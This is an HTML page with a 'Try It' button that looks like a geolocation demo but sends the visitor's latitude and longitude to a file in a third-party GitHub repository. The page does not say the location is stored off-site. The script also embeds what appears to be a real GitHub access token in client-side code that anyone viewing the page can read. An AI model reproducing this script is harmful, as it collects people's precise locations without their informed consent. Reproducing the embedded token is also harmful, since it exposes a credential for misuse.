<button onclick="getLocation()">Try It</button>

<script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const url = 'https://api.github.com/repos/MadaraUchiha775/Coder/contents/location.txt';
        const token = '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';

        fetch(url)
            .then(response => response.json())
            .then(data => {
                const sha = data.sha;
                updateLocation(lat, long, sha, token);
            })
            .catch(error => {
                console.error('Error fetching file details:', error);
                alert('An error occurred while fetching file details');
            });
    }

    function updateLocation(lat, long, sha, token) {
    const url = 'https://api.github.com/repos/MadaraUchiha775/Coder/contents/location.txt';

    fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: 'Update location.txt',
            content: btoa(`lat: ${lat}\nlong: ${long}\n`),
            sha: sha
        })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to update location.txt');
            }
            alert('Data stored successfully');
        })
        .catch(error => {
            console.error('Error updating location.txt:', error);
            alert('An error occurred while updating location.txt');
        });
    }
</script>
